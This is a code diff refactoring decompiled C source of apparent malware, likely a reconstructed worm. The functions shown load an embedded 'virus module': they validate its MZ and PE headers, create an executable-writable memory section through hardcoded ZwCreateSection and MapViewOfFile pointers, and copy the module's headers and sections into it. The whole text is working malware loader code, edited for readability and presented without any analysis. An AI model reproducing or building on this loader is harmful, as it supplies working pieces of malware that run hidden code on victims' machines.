@@ -192,19 +192,18 @@ __declspec(naked) void BLOCK4_memcpy(void *pDestination, const void *pSource, un
 // 99% (C) CODE MATCH
 void BLOCK4_CopyDataIntoMapView(PVOID pVirusModule, PIMAGE_NT_HEADERS pImageNT, LPVOID pMapViewOfFile)
 {
-	INT32 dwNumberOfSections; // [sp+0h] [bp-Ch]@1
-	PIMAGE_SECTION_HEADER pImageSections; // [sp+4h] [bp-8h]@1
-	INT32 dwCurrentSection; // [sp+8h] [bp-4h]@1
-
-	dwNumberOfSections = pImageNT->FileHeader.NumberOfSections;
+	// Copy them headers first
 	BLOCK4_memcpy(pMapViewOfFile, pVirusModule, pImageNT->OptionalHeader.SizeOfHeaders);
-	pImageSections = (PIMAGE_SECTION_HEADER)((DWORD)pImageNT + pImageNT->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD));
+
+	PIMAGE_SECTION_HEADER pCurrSection = (PIMAGE_SECTION_HEADER)((DWORD)pImageNT + pImageNT->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD));
 
 	// Copy section by section
-	for(dwCurrentSection = 0; dwCurrentSection < dwNumberOfSections; dwCurrentSection++, pImageSections++)
+	INT32 dwCurrentSection;
+	INT32 dwNumberOfSections = pImageNT->FileHeader.NumberOfSections;
+	for(dwCurrentSection = 0; dwCurrentSection < dwNumberOfSections; dwCurrentSection++, pCurrSection++)
 	{
-		if(pImageSections->SizeOfRawData) // If the section VirtualSize is valid copy the entire section
-			BLOCK4_memcpy((void *)((DWORD)pMapViewOfFile + pImageSections->VirtualAddress), (const void *)((DWORD)pVirusModule + pImageSections->PointerToRawData), pImageSections->SizeOfRawData);
+		if(pCurrSection->SizeOfRawData) // If the section VirtualSize is valid copy the entire section
+			BLOCK4_memcpy((void *)((DWORD)pMapViewOfFile + pCurrSection->VirtualAddress), (const void *)((DWORD)pVirusModule + pCurrSection->PointerToRawData), pCurrSection->SizeOfRawData);
 	}
 }
 
@@ -246,20 +245,26 @@ INT32 BLOCK4_LoadVirusModuleInfo(PHARDCODED_ADDRESSES pHardAddrs, GENERAL_INFO_B
 	HANDLE hSectionHandle; // [sp+14h] [bp-8h]@5
 	PIMAGE_DOS_HEADER pImageDOS; // [sp+18h] [bp-4h]@1
 
-	sInfoBlock->MappedAddress = 0;
+	sInfoBlock->MappedAddress = 0; // Null out that bitch
+
 	pImageDOS = (PIMAGE_DOS_HEADER)pVirusModule;
 
-	if(((PIMAGE_DOS_HEADER)pVirusModule)->e_magic != MZ_HEADER) return -2;
+	// Not a .exe
+	if(((PIMAGE_DOS_HEADER)pVirusModule)->e_magic != MZ_HEADER)
+		return -2;
 
+	// Not PE
 	pImageNT = (PIMAGE_NT_HEADERS)((DWORD)pVirusModule + pImageDOS->e_lfanew);
-	if(pImageNT->Signature != PE_HEADER) return -2;
+	if(pImageNT->Signature != PE_HEADER)
+		return -2;
 
 	liMaximumSize.LowPart  = pImageNT->OptionalHeader.SizeOfImage; // 0x00006000
 	liMaximumSize.HighPart = 0;
 
 	// ZwCreateSection(..., 0xF001F, 0, ..., 64, 0x8000000, 0)
 	iStatus = pHardAddrs->ZwCreateSection(&hSectionHandle, SECTION_ALL_ACCESS, 0, &liMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
-	if(iStatus != STATUS_SUCCESS) return -11;
+	if(iStatus != STATUS_SUCCESS)
+		return -11;
 
 	pMapViewOfFile = pHardAddrs->MapViewOfFile(hSectionHandle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
 	if(!pMapViewOfFile)
@@ -269,6 +274,7 @@ INT32 BLOCK4_LoadVirusModuleInfo(PHARDCODED_ADDRESSES pHardAddrs, GENERAL_INFO_B
 	}
 
 	sInfoBlock->MappedAddress = hSectionHandle;
+
 	BLOCK4_CopyDataIntoMapView(pVirusModule, pImageNT, pMapViewOfFile);
 	BLOCK4_CopyPEHeaderInfo(sInfoBlock, pImageNT, iVirusModuleSize);
 
